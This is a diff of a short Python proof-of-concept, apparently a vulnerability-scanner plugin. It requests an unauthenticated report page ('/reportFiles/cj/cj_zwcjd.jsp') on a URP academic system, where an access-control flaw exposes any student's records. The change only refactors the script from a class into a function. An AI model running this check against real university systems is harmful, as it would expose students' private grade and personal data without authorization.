@@ -9,17 +9,10 @@ description: urp查询接口未设置权限，可以越权查询任意学生信�
 import sys
 import requests
 import warnings
-
-
-
-class query:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['urp查询接口曝露','','']
         payload = "/reportFiles/cj/cj_zwcjd.jsp"
-        vulnurl = self.url + payload
+        vulnurl = url + payload
         try:
             req = requests.get(vulnurl, timeout=10, verify=False)
 
@@ -35,5 +28,5 @@ class query:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = query(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
+
